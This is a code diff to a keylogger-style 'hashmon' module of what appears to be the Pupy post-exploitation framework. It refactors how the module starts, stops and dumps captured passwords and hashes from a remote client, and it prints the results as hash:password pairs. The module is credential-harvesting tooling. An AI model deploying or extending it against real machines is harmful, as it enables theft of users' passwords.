@@ -29,9 +29,13 @@ class KeyloggerModule(PupyModule):
         self.arg_parser.add_argument('action', choices=['start', 'stop', 'dump'])
 
     def run(self, args):
+        start = self.client.remote('hashmon', 'start')
+        stop = self.client.remote('hashmon', 'stop', False)
+        dump = self.client.remote('hashmon', 'dump')
+
         hashmon = self.client.conn.modules.hashmon
         if args.action == 'start':
-            hashmon.start(
+            start(
                 [ x.strip() for x in args.filter.split(',') ],
                 hashes=args.hashes.split(),
                 poll=args.poll,
@@ -40,12 +44,12 @@ class KeyloggerModule(PupyModule):
                 policy=args.policy
             )
         elif args.action == 'dump':
-            results = hashmon.dump()
+            results = dump()
             if results is None:
                 self.error('HashMon is not started')
             else:
-                results = obtain(results)
                 for password, hash in results:
                     self.success('{}:{}'.format(hash, password))
+
         elif args.action == 'stop':
-            hashmon.stop()
+            stop()
